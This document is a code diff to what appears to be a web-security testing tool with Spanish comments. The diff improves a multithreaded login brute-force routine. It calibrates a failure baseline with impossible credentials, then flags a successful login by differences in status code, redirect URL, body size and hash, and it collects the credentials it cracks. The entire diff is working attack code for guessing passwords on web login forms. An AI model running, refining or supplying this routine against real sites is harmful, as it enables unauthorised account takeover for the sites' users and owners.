@@ -1288,44 +1288,75 @@ def bruteforce_login(target, session, usernames, passlist, max_threads=5):
         print_info(f"Iniciando bruteforce con {len(usernames)} usuarios y {len(passwords)} contraseñas (total {total_combinations} combinaciones)...")
         
         found_credentials = set()  # Usar set para evitar duplicados
-        
-        def is_successful_login(response, form_url):
-            """Determina si la respuesta indica un login exitoso."""
-            # Redirección a página de dashboard, home, etc.
-            if response.status_code == 302:
-                location = response.headers.get('Location', '').lower()
-                if any(x in location for x in ['dashboard', 'home', 'admin', 'profile', 'account']):
-                    return True
-            # Contenido de la respuesta
-            content = response.text.lower()
-            success_indicators = [
-                'dashboard', 'welcome', 'logged in', 'login successful',
-                'redirect', 'profile', 'my account', 'logout'
-            ]
-            if any(indicator in content for indicator in success_indicators):
+
+        # ── Calibración basal ─────────────────────────────────────────────────
+        # Enviamos credenciales imposibles para obtener la respuesta de FALLO
+        # y comparar diferencialmente cada intento real contra ella.
+        _IMPOSSIBLE_USER = "__wstg_x7z9q__"
+        _IMPOSSIBLE_PASS = "__wstg_x7z9q__"
+
+        class Baseline:
+            status: int = -1
+            final_url: str = ""
+            body_len: int = 0
+            body_hash: str = ""
+
+        import hashlib
+
+        baselines: list[Baseline] = []
+        for form in login_forms:
+            bl = Baseline()
+            try:
+                r = session.post(
+                    form['url'],
+                    data={form['user_field']: _IMPOSSIBLE_USER, form['pass_field']: _IMPOSSIBLE_PASS},
+                    timeout=DEFAULT_TIMEOUT, allow_redirects=True
+                )
+                bl.status    = r.status_code
+                bl.final_url = r.url
+                bl.body_len  = len(r.content)
+                bl.body_hash = hashlib.md5(r.content).hexdigest()
+                print_info(f"Baseline calibrado para {form['url']}: "
+                           f"status={bl.status} len={bl.body_len} url={bl.final_url}")
+            except Exception as e:
+                print_warning(f"No se pudo calibrar baseline para {form['url']}: {e}")
+            baselines.append(bl)
+
+        def is_successful_login(resp: "requests.Response", bl: "Baseline") -> bool:
+            """Detecta login exitoso por comparación diferencial contra el baseline de fallo."""
+            # 1. Código de respuesta diferente al baseline (ej: 302 vs 200)
+            if bl.status != -1 and resp.status_code != bl.status:
                 return True
-            # Comparar tamaño de respuesta con un intento fallido (heurística)
-            # (Esto es más complejo, lo dejamos como opción)
+            # 2. URL final diferente al baseline (la app redirige a otro sitio)
+            if bl.final_url and resp.url != bl.final_url:
+                return True
+            # 3. Tamaño de cuerpo significativamente distinto (>15 % y >150 bytes)
+            if bl.body_len > 0:
+                diff = abs(len(resp.content) - bl.body_len)
+                ratio = diff / bl.body_len
+                if ratio > 0.15 and diff > 150:
+                    return True
+            # 4. Hash distinto Y tamaño diferente (descarta páginas dinámicas con tokens)
+            if bl.body_hash:
+                curr_hash = hashlib.md5(resp.content).hexdigest()
+                if curr_hash != bl.body_hash and abs(len(resp.content) - bl.body_len) > 150:
+                    return True
             return False
-        
-        def try_cred(user, pwd):
-            for form in login_forms:
-                data = {form['user_field']: user, form['pass_field']: pwd}
-                try:
-                    if REQUEST_DELAY > 0:
-                        time.sleep(REQUEST_DELAY)
-                    # Primero con allow_redirects=False para capturar redirecciones
-                    resp = session.post(form['url'], data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
-                    if is_successful_login(resp, form['url']):
-                        found_credentials.add((user, pwd))
-                        return True
-                    # Si no, seguir la redirección y comprobar el contenido final
-                    resp2 = session.post(form['url'], data=data, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
-                    if is_successful_login(resp2, form['url']):
-                        found_credentials.add((user, pwd))
-                        return True
-                except:
-                    pass
+
+        def try_cred(user, pwd, form, bl):
+            try:
+                if REQUEST_DELAY > 0:
+                    time.sleep(REQUEST_DELAY)
+                resp = session.post(
+                    form['url'],
+                    data={form['user_field']: user, form['pass_field']: pwd},
+                    timeout=DEFAULT_TIMEOUT, allow_redirects=True
+                )
+                if is_successful_login(resp, bl):
+                    found_credentials.add((user, pwd))
+                    return True
+            except Exception:
+                pass
             return False
         
         if HAS_TQDM:
@@ -1334,21 +1365,24 @@ def bruteforce_login(target, session, usernames, passlist, max_threads=5):
                     futures = []
                     for user in usernames:
                         for pwd in passwords:
-                            futures.append(executor.submit(try_cred, user, pwd))
+                            for form, bl in zip(login_forms, baselines):
+                                futures.append(executor.submit(try_cred, user, pwd, form, bl))
                     for future in as_completed(futures):
                         future.result()
                         pbar.update(1)
         else:
             completed = 0
+            total_tasks = total_combinations * len(login_forms)
             with ThreadPoolExecutor(max_workers=max_threads) as executor:
                 futures = []
                 for user in usernames:
                     for pwd in passwords:
-                        futures.append(executor.submit(try_cred, user, pwd))
+                        for form, bl in zip(login_forms, baselines):
+                            futures.append(executor.submit(try_cred, user, pwd, form, bl))
                 for future in as_completed(futures):
                     completed += 1
-                    if completed % 100 == 0 or completed == total_combinations:
-                        print_info(f"Progreso bruteforce: {completed}/{total_combinations} combinaciones probadas")
+                    if completed % 100 == 0 or completed == total_tasks:
+                        print_info(f"Progreso bruteforce: {completed}/{total_tasks} combinaciones probadas")
                     future.result()
         
         if found_credentials:
